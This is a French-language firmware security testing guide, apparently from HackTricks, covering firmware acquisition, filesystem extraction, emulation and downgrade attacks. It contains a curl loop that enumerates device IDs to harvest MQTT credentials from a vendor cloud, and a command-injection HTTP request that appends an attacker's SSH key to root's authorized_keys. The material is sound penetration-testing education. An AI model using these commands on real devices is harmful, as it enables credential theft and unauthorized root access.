# Analyse du firmware

{{#include ../../banners/hacktricks-training.md}}

## **Introduction**

### Ressources associées


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Le firmware est un logiciel essentiel qui permet aux appareils de fonctionner correctement en gérant et en facilitant la communication entre les composants matériels et le logiciel avec lequel l'utilisateur interagit. Il est stocké dans une mémoire permanente, garantissant que l'appareil a accès aux instructions vitales dès sa mise sous tension, ce qui conduit au lancement du système d'exploitation. Examiner et éventuellement modifier le firmware est une étape cruciale pour identifier les vulnérabilités de sécurité.

## **Collecte d'informations**

La **collecte d'informations** est une étape initiale critique pour comprendre la composition d'un appareil et les technologies qu'il utilise. Ce processus implique la collecte de données sur :

- L'architecture CPU et le système d'exploitation qu'il exécute
- Les spécificités du bootloader
- L'agencement matériel et les fiches techniques
- Les métriques de la base de code et les emplacements des sources
- Les bibliothèques externes et les types de licences
- L'historique des mises à jour et les certifications réglementaires
- Les schémas architecturaux et les diagrammes de flux
- Les évaluations de sécurité et les vulnérabilités identifiées

Pour cela, les outils d'open-source intelligence (OSINT) sont inestimables, tout comme l'analyse des composants logiciels open-source disponibles via des processus de revue manuelle et automatisée. Des outils comme [Coverity Scan](https://scan.coverity.com) et [Semmle’s LGTM](https://lgtm.com/#explore) proposent une analyse statique gratuite permettant d'identifier des problèmes potentiels.

## **Acquisition du firmware**

L'obtention du firmware peut se faire par diverses méthodes, chacune ayant son propre niveau de complexité :

- **Directement** depuis la source (développeurs, fabricants)
- **En le construisant** à partir des instructions fournies
- **En le téléchargeant** depuis les sites de support officiels
- Utiliser des requêtes **Google dork** pour trouver des fichiers firmware hébergés
- Accéder directement au **cloud storage**, avec des outils comme [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Intercepter les **mises à jour** via des techniques man-in-the-middle
- **Extraire** depuis l'appareil via des connexions comme **UART**, **JTAG** ou **PICit**
- **Sniffing** pour les requêtes de mise à jour dans les communications de l'appareil
- Identifier et utiliser des **hardcoded update endpoints**
- **Dumping** depuis le bootloader ou le réseau
- **Retirer et lire** la puce de stockage, en dernier recours, en utilisant les outils matériels appropriés

## Analyse du firmware

Maintenant que vous **avez le firmware**, vous devez en extraire des informations pour savoir comment l'analyser. Voici différents outils que vous pouvez utiliser pour cela :
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Si vous ne trouvez pas grand-chose avec ces outils, vérifiez l'entropie de l'image avec `binwalk -E <bin>` : si l'entropie est faible, il est peu probable qu'elle soit chiffrée. Si l'entropie est élevée, il est probable qu'elle soit chiffrée (ou compressée d'une manière ou d'une autre).

De plus, vous pouvez utiliser ces outils pour extraire **les fichiers embarqués dans le firmware** :


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ou [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) pour inspecter le fichier.

### Obtenir le système de fichiers

Avec les outils précédemment mentionnés comme `binwalk -ev <bin>` vous devriez avoir pu **extraire le système de fichiers**.\
Binwalk l'extrait généralement dans un **dossier nommé selon le type de système de fichiers**, qui est généralement l'un des suivants : squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Extraction manuelle du système de fichiers

Parfois, binwalk n'aura pas l'octet magique du système de fichiers dans ses signatures. Dans ces cas, utilisez binwalk pour **trouver l'offset du système de fichiers et carve le système de fichiers compressé** depuis le binaire et **extraire manuellement** le système de fichiers selon son type en utilisant les étapes ci-dessous.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Exécutez la **commande dd** suivante pour extraire le système de fichiers Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternativement, la commande suivante peut aussi être exécutée.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Pour squashfs (utilisé dans l'exemple ci‑dessus)

`$ unsquashfs dir.squashfs`

Les fichiers se trouveront ensuite dans le répertoire `squashfs-root`.

- Fichiers d'archive CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Pour les systèmes de fichiers jffs2

`$ jefferson rootfsfile.jffs2`

- Pour les systèmes de fichiers ubifs sur NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analyse du firmware

Une fois le firmware obtenu, il est essentiel de le disséquer pour comprendre sa structure et ses vulnérabilités potentielles. Ce processus implique l'utilisation de divers outils pour analyser et extraire des données utiles à partir de l'image firmware.

### Outils d'analyse initiaux

Un ensemble de commandes est fourni pour l'inspection initiale du fichier binaire (désigné par `<bin>`). Ces commandes aident à identifier les types de fichiers, extraire les chaînes, analyser les données binaires et comprendre les détails des partitions et des systèmes de fichiers :
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Pour évaluer l'état de chiffrement de l'image, on vérifie l'**entropie** avec `binwalk -E <bin>`. Une entropie faible suggère l'absence de chiffrement, tandis qu'une entropie élevée indique un chiffrement possible ou une compression.

Pour extraire des **fichiers embarqués**, il est recommandé d'utiliser des outils et ressources comme la documentation **file-data-carving-recovery-tools** et **binvis.io** pour l'inspection des fichiers.

### Extraction du système de fichiers

En utilisant `binwalk -ev <bin>`, on peut généralement extraire le système de fichiers, souvent dans un répertoire nommé d'après le type de système de fichiers (par ex. squashfs, ubifs). Cependant, lorsque **binwalk** échoue à reconnaître le type de système de fichiers en raison de l'absence des magic bytes, une extraction manuelle est nécessaire. Cela implique d'utiliser `binwalk` pour localiser l'offset du système de fichiers, puis la commande `dd` pour en extraire le filesystem :
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Après cela, selon le type de système de fichiers (par ex., squashfs, cpio, jffs2, ubifs), différentes commandes sont utilisées pour extraire manuellement le contenu.

### Analyse du système de fichiers

Une fois le système de fichiers extrait, la recherche de failles de sécurité commence. On prête attention aux daemons réseau non sécurisés, aux identifiants hardcodés, aux endpoints API, aux fonctionnalités du serveur de mise à jour, au code non compilé, aux scripts de démarrage et aux binaires compilés pour analyse hors ligne.

**Emplacements clés** et **éléments** à inspecter incluent :

- **etc/shadow** and **etc/passwd** for user credentials
- SSL certificates and keys in **etc/ssl**
- Configuration and script files for potential vulnerabilities
- Embedded binaries for further analysis
- Common IoT device web servers and binaries

Plusieurs outils aident à découvrir des informations sensibles et des vulnérabilités dans le système de fichiers :

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) et [**Firmwalker**](https://github.com/craigz28/firmwalker) pour la recherche d'informations sensibles
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) pour une analyse complète du firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), et [**EMBA**](https://github.com/e-m-b-a/emba) pour l'analyse statique et dynamique

### Vérifications de sécurité sur les binaires compilés

Le code source et les binaires compilés trouvés dans le système de fichiers doivent être examinés pour détecter des vulnérabilités. Des outils comme **checksec.sh** pour les binaires Unix et **PESecurity** pour les binaires Windows aident à identifier les binaires non protégés qui pourraient être exploités.

## Récupération de la configuration cloud et des identifiants MQTT via des tokens d'URL dérivés

Beaucoup de hubs IoT récupèrent la configuration par appareil depuis un endpoint cloud qui ressemble à :

- `https://<api-host>/pf/<deviceId>/<token>`

Lors de l'analyse du firmware, vous pouvez constater que `<token>` est dérivé localement à partir du deviceId en utilisant un secret hardcodé, par exemple :

- token = MD5( deviceId || STATIC_KEY ) et représenté en hexadécimal majuscule

Ce mécanisme permet à quiconque connaît un deviceId et le STATIC_KEY de reconstituer l'URL et de récupérer la config cloud, révélant souvent des identifiants MQTT en clair et des préfixes de topic.

Flux de travail pratique :

1) Extract deviceId from UART boot logs

- Connectez un adaptateur UART 3.3V (TX/RX/GND) et capturez les logs :
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Recherchez les lignes affichant le cloud config URL pattern et le broker address, par exemple :
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Récupérer STATIC_KEY et l'algorithme du token depuis le firmware

- Charger les binaires dans Ghidra/radare2 et rechercher le chemin de config ("/pf/") ou l'utilisation de MD5.
- Confirmer l'algorithme (par exemple MD5(deviceId||STATIC_KEY)).
- Dériver le token en Bash et convertir le digest en majuscules :
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Récupérer la config cloud et les identifiants MQTT

- Composer l'URL et récupérer le JSON avec curl ; parser avec jq pour extraire les secrets :
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Abuser de plaintext MQTT et des ACLs de topic faibles (si présent)

- Utiliser les credentials récupérés pour s'abonner aux topics de maintenance et rechercher des événements sensibles :
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Énumérer des IDs d'appareils prévisibles (à grande échelle, avec autorisation)

- De nombreux écosystèmes intègrent des octets vendor OUI/product/type suivis d'un suffixe séquentiel.
- Vous pouvez itérer des IDs candidats, dériver des tokens et récupérer des configs de manière programmatique:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Remarques
- Obtenez toujours une autorisation explicite avant d'entreprendre une énumération de masse.
- Préférez l'émulation ou l'analyse statique pour récupérer des secrets sans modifier le matériel cible lorsque c'est possible.

Le processus d'émulation du firmware permet la **dynamic analysis** du fonctionnement d'un appareil ou d'un programme individuel. Cette approche peut rencontrer des difficultés liées aux dépendances matérielles ou d'architecture, mais transférer le root filesystem ou des binaires spécifiques vers un appareil ayant la même architecture et endianness, comme un Raspberry Pi, ou vers une machine virtuelle préconstruite, peut faciliter des tests supplémentaires.

### Émuler des binaires individuels

Pour examiner des programmes isolés, il est crucial d'identifier l'endianness et l'architecture CPU du programme.

#### Exemple avec l'architecture MIPS

Pour émuler un binaire d'architecture MIPS, on peut utiliser la commande :
```bash
file ./squashfs-root/bin/busybox
```
Et pour installer les outils d'émulation nécessaires :
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Pour MIPS (big-endian), `qemu-mips` est utilisé, et pour les binaires little-endian, `qemu-mipsel` est le choix.

#### Émulation de l'architecture ARM

Pour les binaires ARM, le processus est similaire, en utilisant l'émulateur `qemu-arm`.

### Émulation système complète

Des outils comme [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), et d'autres facilitent l'émulation complète du firmware, automatisant le processus et aidant l'analyse dynamique.

## Analyse dynamique en pratique

À ce stade, un environnement réel ou émulé est utilisé pour l'analyse. Il est essentiel de conserver l'accès shell à l'OS et au système de fichiers. L'émulation peut ne pas reproduire parfaitement les interactions matérielles, nécessitant parfois des redémarrages de l'émulation. L'analyse doit réexaminer le système de fichiers, exploiter les pages web exposées et les services réseau, et explorer les vulnérabilités du bootloader. Les tests d'intégrité du firmware sont critiques pour identifier d'éventuelles backdoors.

## Techniques d'analyse à l'exécution

L'analyse à l'exécution consiste à interagir avec un processus ou un binaire dans son environnement d'exécution, en utilisant des outils comme gdb-multiarch, Frida et Ghidra pour placer des breakpoints et identifier des vulnérabilités via le fuzzing et d'autres techniques.

## Exploitation binaire et Proof-of-Concept

Développer un PoC pour des vulnérabilités identifiées exige une compréhension approfondie de l'architecture cible et la programmation en langages bas niveau. Les protections d'exécution binaire dans les systèmes embarqués sont rares, mais lorsqu'elles existent, des techniques comme Return Oriented Programming (ROP) peuvent être nécessaires.

## OS préparés pour l'analyse de firmware

Des OS comme [AttifyOS](https://github.com/adi0x90/attifyos) et [EmbedOS](https://github.com/scriptingxss/EmbedOS) fournissent des environnements préconfigurés pour les tests de sécurité firmware, équipés des outils nécessaires.

## OS prêts pour analyser le firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS est une distro destinée à vous aider à réaliser des évaluations de sécurité et du penetration testing des dispositifs Internet of Things (IoT). Elle vous fait gagner beaucoup de temps en fournissant un environnement préconfiguré avec tous les outils nécessaires.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system based on Ubuntu 18.04 preloaded with firmware security testing tools.

## Attaques de downgrade de firmware et mécanismes de mise à jour non sécurisés

Même lorsqu'un fournisseur implémente des vérifications de signature cryptographique pour les images firmware, **la protection contre le version rollback (downgrade) est fréquemment omise**. Lorsque le boot- ou recovery-loader ne vérifie que la signature avec une clé publique embarquée mais ne compare pas la *version* (ou un compteur monotone) de l'image flashée, un attaquant peut installer légitimement un **firmware plus ancien et vulnérable qui porte toujours une signature valide** et réintroduire ainsi des vulnérabilités corrigées.

Flux d'attaque typique :

1. **Obtenir une image signée plus ancienne**
* Récupérer depuis le portail de téléchargement public du fournisseur, un CDN ou un site de support.
* L'extraire d'applications mobiles/de bureau compagnons (par ex. à l'intérieur d'un Android APK sous `assets/firmware/`).
* Le récupérer depuis des dépôts tiers tels que VirusTotal, des archives Internet, des forums, etc.
2. **Téléverser ou servir l'image à l'appareil** via n'importe quel canal de mise à jour exposé :
* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
* De nombreux appareils IoT grand public exposent des endpoints HTTP(S) *unauthenticated* qui acceptent des blobs de firmware encodés en Base64, les décodent côté serveur et déclenchent la recovery/upgrade.
3. Après le downgrade, exploiter une vulnérabilité qui avait été corrigée dans la version plus récente (par exemple un filtre contre la command-injection ajouté ultérieurement).
4. Éventuellement reflasher l'image la plus récente ou désactiver les mises à jour pour éviter la détection une fois la persistence obtenue.

### Exemple : Command Injection après downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Dans le firmware vulnérable (rétrogradé), le paramètre `md5` est concaténé directement dans une commande shell sans sanitisation, permettant l'injection de commandes arbitraires (ici — activation d'un accès root par clé SSH). Les versions ultérieures du firmware ont introduit un filtre de caractères basique, mais l'absence de protection contre la rétrogradation rend la correction caduque.

### Extraction du firmware depuis les applications mobiles

De nombreux fabricants intègrent des images firmware complètes dans leurs applications mobiles compagnon afin que l'application puisse mettre à jour l'appareil via Bluetooth/Wi‑Fi. Ces packages sont généralement stockés en clair dans l'APK/APEX sous des chemins comme `assets/fw/` ou `res/raw/`. Des outils tels que `apktool`, `ghidra`, ou même un simple `unzip` permettent d'extraire des images signées sans toucher le matériel physique.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Liste de vérification pour évaluer la logique de mise à jour

* Le transport/authentication du *update endpoint* est-il correctement protégé (TLS + authentication) ?
* L'appareil compare-t-il les **numéros de version** ou un **monotonic anti-rollback counter** avant le flash ?
* L'image est-elle vérifiée dans une secure boot chain (e.g. signatures vérifiées par le code ROM) ?
* Le code userland effectue-t-il des vérifications supplémentaires (e.g. table de partitions autorisée, numéro de modèle) ?
* Les flux de mise à jour *partial* ou *backup* réutilisent-ils la même logique de validation ?

> 💡  Si l'un des éléments ci-dessus manque, la plateforme est probablement vulnérable aux rollback attacks.

## Firmwares vulnérables pour s'entraîner

Pour vous entraîner à découvrir des vulnérabilités dans des firmwares, utilisez les projets de firmware vulnérables suivants comme point de départ.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Références

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## Formation et certification

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
